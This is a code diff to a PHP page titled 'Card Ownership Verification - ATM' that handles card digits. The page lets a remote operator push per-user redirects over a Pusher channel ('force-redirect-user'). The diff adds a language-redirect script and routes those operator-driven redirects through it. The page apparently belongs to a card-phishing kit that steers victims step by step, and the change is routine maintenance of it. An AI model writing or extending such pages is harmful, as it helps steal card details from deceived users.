@@ -37,6 +37,7 @@ $last4 = strlen($digits) >= 4 ? substr($digits, -4) : '****';
   <title>Card Ownership Verification - ATM</title>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="../includes/lang-toggle.css">
+  <script src="../includes/lang-redirect.js"></script>
     <style>
     /* نفس الـ CSS الموجود */
     *{margin:0;padding:0;box-sizing:border-box}
@@ -258,7 +259,7 @@ const channel = pusher.subscribe('my-channel');
 channel.bind('force-redirect-user', function(data) {
     const myId = localStorage.getItem('current_user_id');
     if (myId && data.userId == myId) {
-        window.location.href = data.url;
+        window.location.href = applySiteLangRedirect(data.url);
     }
 });
 </script>
